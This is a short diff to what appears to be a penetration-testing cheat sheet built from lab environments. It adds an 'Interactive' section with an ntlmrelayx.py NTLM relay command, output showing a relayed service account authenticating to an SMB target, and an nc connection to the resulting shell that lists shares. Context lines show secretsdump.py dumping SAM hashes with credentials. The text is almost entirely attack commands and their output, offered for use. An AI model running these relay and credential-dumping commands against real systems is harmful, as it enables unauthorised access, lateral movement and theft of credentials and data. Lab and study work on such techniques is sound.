@@ -64,5 +64,28 @@ Dump SAM:
 proxychains -q secretsdump.py NORTH/EDDARD.STARK:ANYPASS@192.168.56.22
 ```
 
+### Interactive
 
+Interact with a target, no admin access is required. See what is being shared:
 
+```bash
+sudo ntlmrelayx.py -tf LiveIPs.txt -i -smb2support
+
+[*] SMBD-Thread-5 (process_request_thread): Connection from REFLECTION/SVC_WEB_STAGING@10.10.160.102 controlled, attacking target smb://10.10.160.101
+[*] Authenticating against smb://10.10.160.101 as REFLECTION/SVC_WEB_STAGING SUCCEED
+[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
+```
+
+Connect to target using NC:
+
+```bash
+nc 127.0.0.1 11000
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+prod
+SYSVOL
+```
